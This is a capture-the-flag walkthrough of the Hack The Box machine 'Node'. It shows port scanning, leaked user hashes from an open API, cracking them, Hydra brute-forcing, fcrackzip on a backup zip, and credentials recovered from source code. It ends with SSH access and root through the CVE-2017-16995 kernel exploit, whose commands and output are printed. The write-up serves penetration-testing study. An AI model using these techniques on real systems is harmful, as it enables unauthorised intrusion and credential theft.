# Hackthebox Node

## Enumeration

First do the standard portscanning of every tcp port on the system.

```
$ nmap -Pn -A -T4 -p- 10.129.173.248                                                                                          1 ⨯
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2022-01-08 11:03 EST
Nmap scan report for 10.129.173.248
Host is up (0.037s latency).
Not shown: 65533 filtered ports
PORT     STATE SERVICE            VERSION
22/tcp   open  ssh                OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 dc:5e:34:a6:25:db:43:ec:eb:40:f4:96:7b:8e:d1:da (RSA)
|   256 6c:8e:5e:5f:4f:d5:41:7d:18:95:d1:dc:2e:3f:e5:9c (ECDSA)
|_  256 d8:78:b8:5d:85:ff:ad:7b:e6:e2:b5:da:1e:52:62:36 (ED25519)
3000/tcp open  hadoop-tasktracker Apache Hadoop
| hadoop-datanode-info: 
|_  Logs: /login
| hadoop-tasktracker-info: 
|_  Logs: /login
|_http-title: MyPlace
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Browsing through the api it seems the user infomation is left open 

```
http://10.129.173.248:3000/api/users/

	
0	
_id	"59a7365b98aa325cc03ee51c"
username	"myP14ceAdm1nAcc0uNT"
password	"dffc504aa55359b9265cbebe1e4032fe600b64475ae3fd29c07d23223334d0af"
is_admin	true
1	
_id	"59a7368398aa325cc03ee51d"
username	"tom"
password	"f0e2e750791171b0391b682ec35835bd6a5c3f7c8d1d0191451ec77b4d75f240"
is_admin	false
2	
_id	"59a7368e98aa325cc03ee51e"
username	"mark"
password	"de5a1adf4fedcce1533915edc60177547f1057b61b7119fd130e1f7428705f73"
is_admin	false
3	
_id	"59aa9781cced6f1d1490fce9"
username	"rastating"
password	"5065db2df0d4ee53562c650c29bacf55b97e231e3fe88570abc9edd8b78ac2f0"
is_admin	false
```

Throwing the admin hash to a rainbow table (https://crackstation.net/) shows it is a sha256 and the password is manchester.

Could also do

```
cat myfiles.backup | base64 -d > backup
```

I tried to bruteforce the password with Hydra to get to know the syntax, but this just hangs after the last password it processes

```
$ hydra -v -V -l "myP14ceAdm1nAcc0uNT" -P "pwdfile" -s 3000 10.129.173.248 http-form-post "/api/session/authenticate:{\"username\"\:\"^USER^\",\"password\"\:\"^PASS^\"}:F=failed:C=Cookie"
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-01-08 12:59:39
[INFO] Using HTTP Proxy: http://127.0.0.1:8080
[INFORMATION] escape sequence \: detected in module option, no parameter verification is performed.
[DATA] max 3 tasks per 1 server, overall 3 tasks, 3 login tries (l:1/p:3), ~1 try per task
[DATA] attacking http-post-form://10.129.173.248:3000/api/session/authenticate:{"username"\:"^USER^","password"\:"^PASS^"}:F=failed:C=Cookie
[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
[ATTEMPT] target 10.129.173.248 - login "myP14ceAdm1nAcc0uNT" - pass "Manchester" - 1 of 3 [child 0] (0/0)
[ATTEMPT] target 10.129.173.248 - login "myP14ceAdm1nAcc0uNT" - pass "manchester" - 2 of 3 [child 1] (0/0)
[ATTEMPT] target 10.129.173.248 - login "myP14ceAdm1nAcc0uNT" - pass "testtest" - 3 of 3 [child 2] (0/0)
```

The format of authentication message

```
POST /api/session/authenticate HTTP/1.1
Host: 10.129.173.248:3000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/json;charset=utf-8
Content-Length: 35
Origin: http://10.129.173.248:3000
Connection: close
Referer: http://10.129.173.248:3000/login
Cookie: connect.sid=s%3AIispHcNPslsW_3GdDXsxjJwQVMU3L16H.goQuR4VvCnRnZCnTbTl%2BG5%2BaGILn%2Fw6zksDofWnfXbI

{"username":"asd","password":"asd"}
```

The backup file is base64 encoded and running it through https://www.64baser.com/decode/upload/ reveals it is a zip file. Unfortunately the zip is password protected. This is quickly bruteforced with fcrackzip though.

```
$ fcrackzip -D -u -p /usr/share/wordlists/rockyou.txt myplace 

PASSWORD FOUND!!!!: pw == magicword
```

I looking through the files we can find mark's password from one of the constants

```
$ grep mark *                                                                                                 
app.js:const url         = 'mongodb://mark:5AYRft73VtFpc84k@localhost:27017/myplace?authMechanism=DEFAULT&authSource=myplace';
```

## Initial Access

Using mark's password we found we can login using ssh

```
$ ssh mark@10.129.173.248 
mark@10.129.173.248's password: 

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

		...

Last login: Wed Sep 27 02:33:14 2017 from 10.10.14.3
mark@node:~$ whoami
mark
mark@node:~$ uname -a
Linux node 4.4.0-93-generic #116-Ubuntu SMP Fri Aug 11 21:17:51 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
mark@node:~$ 
```

The user flag is in tom's home directory but we don't have permissions to read it

```
mark@node:~$ ls -al /home/tom/user.txt 
-rw-r----- 1 root tom 33 Sep  3  2017 /home/tom/user.txt
```



## Privilege Escalation

### Method 1: kernel exploit cve-2017-16995

Linux exploit suggester shows several kernel vulnerabilities, which all do not work. This however does

```
[+] [CVE-2017-16995] eBPF_verifier

   Details: https://ricklarabee.blogspot.com/2018/07/ebpf-and-analysis-of-get-rekt-linux.html
   Exposure: highly probable
   Tags: debian=9.0{kernel:4.9.0-3-amd64},fedora=25|26|27,ubuntu=14.04{kernel:4.4.0-89-generic},[ ubuntu=(16.04|17.04) ]{kernel:4.(8|10).0-(19|28|45)-generic}
   Download URL: https://www.exploit-db.com/download/45010
   Comments: CONFIG_BPF_SYSCALL needs to be set && kernel.unprivileged_bpf_disabled != 1
```

Copy the file to the target host, rename, compile and execute

```
mark@node:/tmp$ gcc cve-2017-16995.c -o cve-2017-16995-exploit
mark@node:/tmp$ chmod a+x cve-2017-16995-exploit 
mark@node:/tmp$ ./cve-2017-16995-exploit 
[.] 
[.] t(-_-t) exploit for counterfeit grsec kernels such as KSPP and linux-hardened t(-_-t)
[.] 
[.]   ** This vulnerability cannot be exploited at all on authentic grsecurity kernel **
[.] 
[*] creating bpf map
[*] sneaking evil bpf past the verifier
[*] creating socketpair()
[*] attaching bpf backdoor to socket
[*] skbuff => ffff880027e26700
[*] Leaking sock struct from ffff88000089a000
[*] Sock->sk_rcvtimeo at offset 472
[*] Cred structure at ffff880025664840
[*] UID from cred structure: 1001, matches the current: 1001
[*] hammering cred structure at ffff880025664840
[*] credentials patched, launching shell...
# whoami
root
# ls -al /root/root.txt
-rw-r----- 1 root root 33 Sep  3  2017 /root/root.txt
```




